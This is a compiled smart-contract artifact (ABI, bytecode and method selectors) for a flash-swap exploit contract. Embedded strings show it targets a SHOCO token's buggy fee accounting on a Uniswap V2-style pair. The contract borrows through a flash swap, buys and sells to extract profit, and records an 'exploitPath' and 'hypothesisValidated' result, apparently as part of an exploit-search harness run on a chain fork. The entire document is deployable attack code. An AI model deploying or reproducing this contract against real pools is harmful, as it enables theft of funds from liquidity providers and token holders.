{"abi":[{"type":"constructor","inputs":[],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attemptFlashswap","inputs":[{"name":"lenderPair","type":"address","internalType":"address"},{"name":"shocoPair","type":"address","internalType":"address"},{"name":"router","type":"address","internalType":"address"},{"name":"loanAmount","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"realizedProfit","type":"uint256","internalType":"uint256"}],"stateMutability":"nonpayable"},{"type":"function","name":"executeOnOpportunity","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"exploitPath","inputs":[],"outputs":[{"name":"","type":"string","internalType":"string"}],"stateMutability":"view"},{"type":"function","name":"hypothesisValidated","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"profitAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"profitToken","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"pure"},{"type":"function","name":"uniswapV2Call","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x60a080604052346100f257630b4a282f60e11b81526020816004817331a4f372aa891b46ba44dc64be1d8947c889e9c65afa9081156100ca576004916020915f916100d5575b506040516315ab88c960e31b815292839182906001600160a01b03165afa9081156100ca575f9161009b575b506080526040516121ce908161014d82396080518181816102de0152818161062f01526114cc0152f35b6100bd915060203d6020116100c3575b6100b581836100f6565b81019061012d565b5f610071565b503d6100ab565b6040513d5f823e3d90fd5b6100ec9150823d84116100c3576100b581836100f6565b5f610045565b5f80fd5b601f909101601f19168101906001600160401b0382119082101761011957604052565b634e487b7160e01b5f52604160045260245ffd5b908160209103126100f257516001600160a01b03811681036100f2579056fe608080604052600436101561001c575b50361561001a575f80fd5b005b5f905f3560e01c90816310d1e85c146104ff575080633c2448ed146104e3578063424e5a9f14610228578063463defd11461020557806349343624146101dd5780635ff972cc146101475763cb707c620361000f5734610144578060031936011261014457604051908060015490610093826111ed565b808552916001811690811561011d57506001146100d3575b6100cf846100bb81860382611105565b604051918291602083526020830190611082565b0390f35b600181525f5160206121795f395f51905f52939250905b808210610103575090915081016020016100bb826100ab565b9192600181602092548385880101520191019092916100ea565b60ff191660208087019190915292151560051b850190920192506100bb91508390506100ab565b80fd5b50346101445780600319360112610144576040516370a0823160e01b8152306004820152906020826024815f5160206121595f395f51905f525afa9081156101d1579061019a575b602090604051908152f35b506020813d6020116101c9575b816101b460209383611105565b810103126101c5576020905161018f565b5f80fd5b3d91506101a7565b604051903d90823e3d90fd5b503461014457806003193601126101445760206040515f5160206121595f395f51905f528152f35b5034610144578060031936011261014457602060ff600254166040519015158152f35b50346101445760803660031901126101445761024261106c565b602435906001600160a01b03821682036104df576044356001600160a01b03811681036104db57606435923033036104aa57604051630dfe168160e01b815285946001600160a01b03851694909190602082600481895afa801561049f578361030b91610319948a91610470575b50604080516001600160a01b03958616602082015297851690880152968316606087015260808601529481167f00000000000000000000000000000000000000000000000000000000000000009091161493839060a0820190565b03601f198101845283611105565b82156104695780925b15610463575083925b803b1561045f5761036e938580946040519687958694859363022c0d9f60e01b855260048501526024840152306044840152608060648401526084830190611082565b03925af180156104545761043f575b50506040516370a0823160e01b81523060048201526020816024815f5160206121595f395f51905f525afa9182156101d1579161040d575b5066038d7ea4c6800081106103cf57602090604051908152f35b60405162461bcd60e51b81526020600482015260166024820152751c1c9bd99a5d0818995b1bddc81d1a1c995cda1bdb1960521b6044820152606490fd5b90506020813d602011610437575b8161042860209383611105565b810103126101c557515f6103b5565b3d915061041b565b8161044991611105565b61014457805f61037d565b6040513d84823e3d90fd5b8480fd5b9261032b565b8492610322565b610492915060203d602011610498575b61048a8183611105565b810190611280565b5f6102b0565b503d610480565b6040513d89823e3d90fd5b60405162461bcd60e51b815260206004820152600960248201526873656c66206f6e6c7960b81b6044820152606490fd5b8380fd5b8280fd5b50346101445780600319360112610144576104fc61137b565b80f35b9050346101c55760803660031901126101c55761051a61106c565b602435916064359067ffffffffffffffff82116101c557366023830112156101c557816004013567ffffffffffffffff81116101c55782013660248201116101c557608090839003126101c557610573602483016110a6565b93610580604484016110a6565b9361058d606485016110a6565b6001600160a01b03958616968616951692338690036110385750306001600160a01b0390911603611006578015610ffa57608490925b01358203610fc3576103e882028281046103e81483151715610faf576103e590049160018301809311610faf578061060b9160021c9081158015610fa5575b610f9a576110f8565b908115610f635760405163095ea7b360e01b8152600481018290525f1960248201527f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03811696916020816044815f8c5af18015610eea57610f46575b5060405163095ea7b360e01b8152600481018490525f1960248201526020816044815f5f5160206121595f395f51905f525af18015610eea57610f29575b50604051916370a0823160e01b83525f5160206121595f395f51905f5260048401526020836024815f5160206121595f395f51905f525afa928315610eea575f93610ef5575b506107076107018383611e85565b876120bc565b92604051610716606082611105565b60028152604096873660208401378a61072e83611153565b525f5160206121595f395f51905f5261074683611174565b52863b156101c557604051635c11d79560e01b8152915f918391829161077491429130919060048601611184565b0381838a5af18015610eea57610ed5575b506040516370a0823160e01b8152306004820152936020856024815f5160206121595f395f51905f525afa948515610d7b578b95610ea1575b50604051916370a0823160e01b83525f5160206121595f395f51905f5260048401526020836024815f5160206121595f395f51905f525afa928315610e96578c93610e62575b50821115610e1d578415610deb5760648502858104606403610dd757606282029180830460621490151715610dd75710610d86576040516370a0823160e01b81523060048201526020816024818d5afa908115610d7b578b91610d49575b5080881115610d415761087590886110f8565b915b8215938415610a6b575b50505050505050506040516370a0823160e01b8152306004820152602081602481875afa80156109e65782918691610a36575b50106109f1576040516370a0823160e01b81523060048201526020816024815f5160206121595f395f51905f525afa80156109e65785906109ad575b66038d7ea4c6800091501061095d57604460209285604051958694859363a9059cbb60e01b8552600485015260248401525af1801561045457610931575080f35b6109529060203d602011610956575b61094a8183611105565b81019061113b565b5080f35b503d610940565b60405162461bcd60e51b815260206004820152602260248201527f696e73756666696369656e742072657461696e65642053484f434f2070726f666044820152611a5d60f21b6064820152608490fd5b506020813d6020116109de575b816109c760209383611105565b810103126101c55766038d7ea4c6800090516108f0565b3d91506109ba565b6040513d87823e3d90fd5b60405162461bcd60e51b815260206004820152601a60248201527f696e73756666696369656e74205745544820746f2072657061790000000000006044820152606490fd5b9150506020813d602011610a63575b81610a5260209383611105565b810103126101c5578190515f6108b4565b3d9150610a45565b674563918244f400008310610cfc57610a8391611e85565b9190610a908382846120bc565b9083821015610cc257610aac92610aa6916110eb565b926110f8565b92610c8d578181610acd92151580610c84575b610ac890612081565b6110ba565b916103e88302928084046103e81490151715610c705790610aed916110f8565b906103e58202918083046103e51490151715610c5c5790610b0d916110cd565b60018101809111610c4857606481029080820460641490151715610c485760628101809111610c48576063610b47910460648104906110eb565b9060018201809211610c4857811015610bf4576040518793610b6a606083611105565b600282523660208301375f5160206121595f395f51905f52610b8b82611153565b5286610b9682611174565b52823b156104db57610bc592849283604051809681958294635c11d79560e01b84524291309160048601611184565b03925af1801561045457610bdf575b808080808080610881565b81610be991611105565b6104db57835f610bd4565b60405162461bcd60e51b815260206004820152602660248201527f72657061796d656e7420636f6e73756d657320616c6c2061747461636b657220604482015265746f6b656e7360d01b6064820152608490fd5b634e487b7160e01b88526011600452602488fd5b634e487b7160e01b89526011600452602489fd5b634e487b7160e01b8a52601160045260248afd5b50818511610abf565b60405162461bcd60e51b815260206004820152600d60248201526c18985908185b5bdd5b9d13dd5d609a1b6044820152606490fd5b60405162461bcd60e51b8152602060048201526012602482015271191d5b5c0818dbdb9cdd5b595cc81c1bdbdb60721b6044820152606490fd5b60405162461bcd60e51b815260206004820152601f60248201527f6175746f2d73776170207468726573686f6c64206e6f742072656163686564006044820152606490fd5b508991610877565b90506020813d602011610d73575b81610d6460209383611105565b810103126101c557515f610862565b3d9150610d57565b6040513d8d823e3d90fd5b60405162461bcd60e51b8152602060048201526024808201527f62757920646964206e6f74207265666c656374206275676779206163636f756e60448201526374696e6760e01b6064820152608490fd5b634e487b7160e01b8c52601160045260248cfd5b60405162461bcd60e51b815260206004820152600a602482015269189d5e4819985a5b195960b21b6044820152606490fd5b60405162461bcd60e51b815260206004820152601d60248201527f6e6f2073796e74686574696320636f6e7472616374206163637275616c0000006044820152606490fd5b9092506020813d602011610e8e575b81610e7e60209383611105565b810103126101c55751915f610804565b3d9150610e71565b6040513d8e823e3d90fd5b9094506020813d602011610ecd575b81610ebd60209383611105565b810103126101c55751935f6107be565b3d9150610eb0565b610ee2919a505f90611105565b5f985f610785565b6040513d5f823e3d90fd5b9092506020813d602011610f21575b81610f1160209383611105565b810103126101c55751915f6106f3565b3d9150610f04565b610f419060203d6020116109565761094a8183611105565b6106ad565b610f5e9060203d6020116109565761094a8183611105565b61066f565b60405162461bcd60e51b815260206004820152600f60248201526e62757920616d6f756e74207a65726f60881b6044820152606490fd5b6005810491506110f8565b5080821015610602565b634e487b7160e01b5f52601160045260245ffd5b60405162461bcd60e51b815260206004820152600f60248201526e189859081b1bd85b88185b5bdd5b9d608a1b6044820152606490fd5b506084604435926105c3565b60405162461bcd60e51b815260206004820152600a6024820152693130b21039b2b73232b960b11b6044820152606490fd5b62461bcd60e51b815260206004820152600f60248201526e3130b2103632b73232b9103830b4b960891b6044820152606490fd5b600435906001600160a01b03821682036101c557565b805180835260209291819084018484015e5f828201840152601f01601f1916010190565b35906001600160a01b03821682036101c557565b81810292918115918404141715610faf57565b81156110d7570490565b634e487b7160e01b5f52601260045260245ffd5b91908201809211610faf57565b91908203918211610faf57565b90601f8019910116810190811067ffffffffffffffff82111761112757604052565b634e487b7160e01b5f52604160045260245ffd5b908160209103126101c5575180151581036101c55790565b8051156111605760200190565b634e487b7160e01b5f52603260045260245ffd5b8051600110156111605760400190565b91909493929460a083019083525f602084015260a060408401528151809152602060c084019201905f5b8181106111ce575050506001600160a01b03909416606082015260800152565b82516001600160a01b03168452602093840193909201916001016111ae565b90600182811c9216801561121b575b602083101461120757565b634e487b7160e01b5f52602260045260245ffd5b91607f16916111fc565b818110611230575050565b5f8155600101611225565b90601f8211611248575050565b6112749160015f5260205f20906020601f840160051c83019310611276575b601f0160051c0190611225565b565b9091508190611267565b908160209103126101c557516001600160a01b03811681036101c55790565b604051906112ae606083611105565b6031825270652066656573206172652061637469766560781b6040837f416e79206275792061667465722074726164696e67206f70656e73207768657260208201520152565b60405190611303608083611105565b605d82527f68696c65205f7465616d4465762072656d61696e73206e6f6e7a65726f0000006060837f416e792077616c6c65742d746f2d77616c6c6574207472616e7366657220626560208201527f747765656e206e6f6e2d6665652d6578656d707420616464726573736573207760408201520152565b5f805560ff19600254166002556113936001546111ed565b601f8111611e46575b5060186b373796b2bc32b1baba34b7b760a11b0160018190556040516001624ab56760e01b031981526020816004815f5160206121595f395f51905f525afa908115610eea575f91611e27575b5015611dc35750604051636ddd171360e01b81526020816004815f5160206121595f395f51905f525afa908115610eea575f91611da4575b5015611d3e57604051630b4a282f60e11b81526020816004815f5160206121595f395f51905f525afa908115610eea575f91611d1f575b506040516324dead2f60e11b8152906020826004815f5160206121595f395f51905f525afa918215610eea575f92611cfe575b5060405163c45a015560e01b8152916020836004816001600160a01b0386165afa8015610eea576044935f91611cdf575b5060405163e6a4390560e01b81527f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03818116600484015273a0b86991c6218b36c1d19d4a2e9eb0ce3606eb486024840152919590926020928792918391165afa938415610eea575f94611cbe575b506001600160a01b03841615611bef5761154c9082611e85565b8094915015611b26576040519361010085019085821067ffffffffffffffff831117611127576030916040528060091c8652610180810460208701528060081c604087015260c0810460608701528060071c60808701526060810460a08701528060061c60c08701520460e08501525f935f5b6008811015611b1c578060051b8201518015611b135760405163424e5a9f60e01b81526001600160a01b03858116600483015286811660248301528716604482015260648101919091526020816084815f305af15f9181611ae0575b5061162c575b506001905b016115bf565b66038d7ea4c68000919650805f5510159485611648575f611621565b50505050505b6117715761165d6001546111ed565b601f8111611728575b5060af60015560015f527f696e6665617369626c653a20746573746564207075626c69632d6c69717569645f5160206121795f395f51905f52557f6974792073697a696e6720636f756c64206e6f742072657461696e20706f73747fb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf7557f2d72657061796d656e7420746f6b656e2070726f6669740000000000000000007fb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf855565b60015f5261176b90601f0160051c5f5160206121795f395f51905f52017fb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf9611225565b5f611666565b60405163fe76374f60e01b8152906020826004815f5160206121595f395f51905f525afa8015610eea576020925f91611ac3575b501561196b57611892603460036117ba61129f565b6004866040516117cb604082611105565b601e8152818082017f416e792073656c6c20776865726520666565732061726520616374697665000081526117fe6112f4565b926040519b878d985191829101858a015e87019063010169f160e51b84830152518092602483015e010190620101d960ed1b84830152805192839101600783015e01017f20696e6665617369626c65206265636175736520756e69737761704f6e6c7920838201527369732074727565206174207468697320666f726b60601b602382015203016014810185520183611105565b815167ffffffffffffffff8111611127576118b7816118b26001546111ed565b61123b565b602092601f82116001146118ff57928192935f926118f4575b50508160011b915f199060031b1c1916176001555b600160ff196002541617600255565b015190505f806118d0565b601f1982169360015f525f5160206121795f395f51905f52915f5b868110611953575083600195961061193b575b505050811b016001556118e5565b01515f1960f88460031b161c191690555f808061192d565b9192602060018192868501518155019401920161191a565b611a13600461197861129f565b816119816112f4565b60405161198f604082611105565b601e81528780808301937f416e792073656c6c20776865726520666565732061726520616374697665000085526040519a878c985191829101848a015e87019063010169f160e51b83830152805192839101602483015e01019063010169f160e51b84830152518092600883015e01015f838201520301601f198101845283611105565b815167ffffffffffffffff811161112757611a33816118b26001546111ed565b602092601f8211600114611a7057928192935f92611a65575b50508160011b915f199060031b1c1916176001556118e5565b015190505f80611a4c565b601f1982169360015f525f5160206121795f395f51905f52915f5b868110611aab575083600195961061193b57505050811b016001556118e5565b91926020600181928685015181550194019201611a8b565b611ada9150833d85116109565761094a8183611105565b5f6117a5565b9091506020813d8211611b0b575b81611afb60209383611105565b810103126101c55751905f61161b565b3d9150611aee565b50600190611626565b505050505061164e565b50505050611b356001546111ed565b601f8111611ba6575b50604d60015560015f527f696e6665617369626c653a20656d7074792053484f434f2f57455448206c69715f5160206121795f395f51905f52556575696469747960d01b7fb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf755565b60015f52611be990601f0160051c5f5160206121795f395f51905f52017fb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf8611225565b5f611b3e565b50505050611bfe6001546111ed565b601f8111611c75575b50605960015560015f527f696e6665617369626c653a206e6f2063616e6f6e6963616c205745544820666c5f5160206121795f395f51905f52556b30b9b439bbb0b8103830b4b960a11b7fb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf755565b60015f52611cb890601f0160051c5f5160206121795f395f51905f52017fb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf8611225565b5f611c07565b611cd891945060203d6020116104985761048a8183611105565b925f611532565b611cf8915060203d6020116104985761048a8183611105565b5f6114bc565b611d1891925060203d6020116104985761048a8183611105565b905f61148b565b611d38915060203d6020116104985761048a8183611105565b5f611458565b611d496001546111ed565b601f8111611d79575b507f696e6665617369626c653a206175746f2d737761702064697361626c6564003c600155565b60015f52611d9e90601f0160051c5f5160206121795f395f51905f5290810190611225565b5f611d52565b611dbd915060203d6020116109565761094a8183611105565b5f611421565b611dcc906111ed565b601f8111611dfc575b507f696e6665617369626c653a2074726164696e6720636c6f736564000000000034600155565b60015f52611e2190601f0160051c5f5160206121795f395f51905f5290810190611225565b5f611dd5565b611e40915060203d6020116109565761094a8183611105565b5f6113e9565b60015f52611e6b90601f0160051c5f5160206121795f395f51905f5290810190611225565b5f61139c565b51906001600160701b03821682036101c557565b604051630240bc6b60e21b815292916001600160a01b0390911690606084600481855afa918215610eea575f945f93612026575b50604051630dfe168160e01b815290602082600481845afa908115610eea576004925f92612004575b506020906040519384809263d21220a760e01b82525afa918215610eea575f92611fe3575b506001600160a01b0316905f5160206121595f395f51905f52821480611fce575b611fba576001600160a01b03165f5160206121595f395f51905f52149182611fa7575b505015611f62576001600160701b03809116921690565b60405162461bcd60e51b815260206004820152601860248201527f756e65787065637465642070616972206f72646572696e6700000000000000006044820152606490fd5b6001600160a01b03161490505f80611f4b565b505050916001600160701b03809116921690565b506001600160a01b0381811690841614611f28565b611ffd91925060203d6020116104985761048a8183611105565b905f611f07565b602091925061201f90823d84116104985761048a8183611105565b9190611ee2565b945091506060843d606011612079575b8161204360609383611105565b810103126101c55761205484611e71565b604061206260208701611e71565b95015163ffffffff8116036101c55793915f611eb9565b3d9150612036565b1561208857565b60405162461bcd60e51b815260206004820152600c60248201526b62616420726573657276657360a01b6044820152606490fd5b919082156121245780159182158061211b575b6120d890612081565b6103e584029384046103e503610faf576120f290846110ba565b916103e882029182046103e8141715610faf5761211892612112916110eb565b906110cd565b90565b508015156120cf565b60405162461bcd60e51b815260206004820152600c60248201526b3130b21030b6b7bab73a24b760a11b6044820152606490fdfe00000000000000000000000031a4f372aa891b46ba44dc64be1d8947c889e9c6b10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6a26469706673582212207aab1c027c14f0c9f800a24507e669e9186432b68b0bb37f695b5c04fa42cfc164736f6c634300081e0033","linkReferences":{}},"methodIdentifiers":{"attemptFlashswap(address,address,address,uint256)":"424e5a9f","executeOnOpportunity()":"3c2448ed","exploitPath()":"cb707c62","hypothesisValidated()":"463defd1","profitAmount()":"5ff972cc","profitToken()":"49343624","uniswapV2Call(address,uint256,uint256,bytes)":"10d1e85c"},"id":0}